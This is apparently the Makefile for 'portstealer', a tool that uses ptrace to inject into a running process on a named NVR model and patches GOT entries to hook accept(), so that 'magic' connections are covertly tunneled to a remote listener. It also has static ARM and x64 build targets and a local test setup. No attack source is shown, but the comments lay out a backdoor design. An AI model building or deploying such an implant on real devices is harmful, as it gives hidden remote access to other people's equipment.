# Cross-compilation examples:
#   make CROSS_COMPILE=arm-linux-gnueabihf-    # ARMv7 hard-float
#   make CROSS_COMPILE=arm-linux-gnueabi-      # ARMv7 soft-float (uclibc/musl)
#   make CROSS_COMPILE=aarch64-linux-gnu-      # AArch64
#   make CROSS_COMPILE=mipsel-linux-gnu-       # MIPS little-endian
CROSS_COMPILE ?=

CC          = $(CROSS_COMPILE)gcc
CFLAGS      = -Wall -Wextra -Iinclude $(EXTRA_CFLAGS)
LDFLAGS    ?=

# Override BUILDDIR and BIN for out-of-tree builds (used by the dist target).
BUILDDIR   ?= .
BIN        ?= portstealer

SRCS = main.c             \
       proc/pid.c         \
       proc/exe.c         \
       proc/maps.c        \
       elf/load.c         \
       elf/got.c          \
       elf/sym.c          \
       inject/ptrace.c    \
       inject/hook.c      \
       hook/accept_hook.c

OBJS = $(addprefix $(BUILDDIR)/,$(SRCS:.c=.o))

# hook/accept_hook.c contains naked functions — disable stack protector.
# On ARM targets, force ARM (not Thumb) mode so conditional data-processing
# instructions and register-shifted-register operands assemble correctly.
HOOK_ARCH_FLAGS := $(shell $(CC) -dumpmachine 2>/dev/null | grep -q arm && echo -marm)

# ── Main binary ───────────────────────────────────────────────────────────────

# 'build' is the default goal for recursive dist invocations.
build: $(BIN)

$(BIN): $(OBJS)
	@mkdir -p $(@D)
	$(CC) $(LDFLAGS) -o $@ $^

$(BUILDDIR)/hook/accept_hook.o: hook/accept_hook.c
	@mkdir -p $(@D)
	$(CC) $(CFLAGS) -Os -fno-stack-protector -fno-toplevel-reorder $(HOOK_ARCH_FLAGS) -c -o $@ $<

$(BUILDDIR)/%.o: %.c
	@mkdir -p $(@D)
	$(CC) $(CFLAGS) -c -o $@ $<

# ── Test binaries ─────────────────────────────────────────────────────────────

# libwrap.so simulates libstdsoap2.so: wraps accept() through its own PLT,
# exactly as the NVR's SOAP library does.
test/libwrap.so: test/libwrap.c
	gcc -Wall -shared -fPIC -o $@ $<

# server2: two-path server (direct accept on :19999, wrap_accept on :19998).
# Mirrors the NVR architecture so both GOT patches can be exercised locally.
test/server2: test/server2.c test/libwrap.so
	gcc -Wall -o $@ $< -Wl,-rpath,'$$ORIGIN' -Ltest -lwrap -lpthread

test/server: test/server.c
	gcc -Wall -o $@ $<

# ── Local integration test ────────────────────────────────────────────────────
#
# Topology:
#   remote listener (nc :29990)  ←tunnel→  server2 (:19999/:19998)
#                                           ↑
#                                     portstealer injects
#                                           ↓
#   client.py :29991              →magic→  server2 :19999
#
# Pass criteria:
#   1. magic connection to direct port (19999) is tunneled
#   2. magic connection to soap port  (19998) is tunneled
#   3. non-magic connection is NOT tunneled (connection handled by server2 normally)

test: portstealer test/server2 test/libwrap.so
	bash test/run_test.sh

# ── dist: build all static targets ───────────────────────────────────────────
# Output: dist/portstealer-arm   (ARMv7 hard-float, NVR302-32S kernel 3.18.x)
#         dist/portstealer-x64   (x86-64, statically linked)

dist:
	$(MAKE) build BIN=dist/portstealer-arm BUILDDIR=build/arm \
	        CROSS_COMPILE=arm-linux-gnueabihf- LDFLAGS=-static
	$(MAKE) build BIN=dist/portstealer-x64 BUILDDIR=build/x64 \
	        LDFLAGS=-static
	@echo ""
	@file dist/portstealer-arm dist/portstealer-x64

dist-debug:
	$(MAKE) build BIN=dist/portstealer-arm-debug BUILDDIR=build/arm-debug \
	        CROSS_COMPILE=arm-linux-gnueabihf- LDFLAGS=-static \
	        EXTRA_CFLAGS=-DDEBUG_HOOK
	@echo ""
	@file dist/portstealer-arm-debug

clean:
	rm -rf build dist
	rm -f $(OBJS) portstealer test/server test/server2 test/libwrap.so
	rm -f /tmp/remote.log /tmp/srv2.log /tmp/ps_test.log /tmp/client.log

.PHONY: all build dist dist-debug clean test
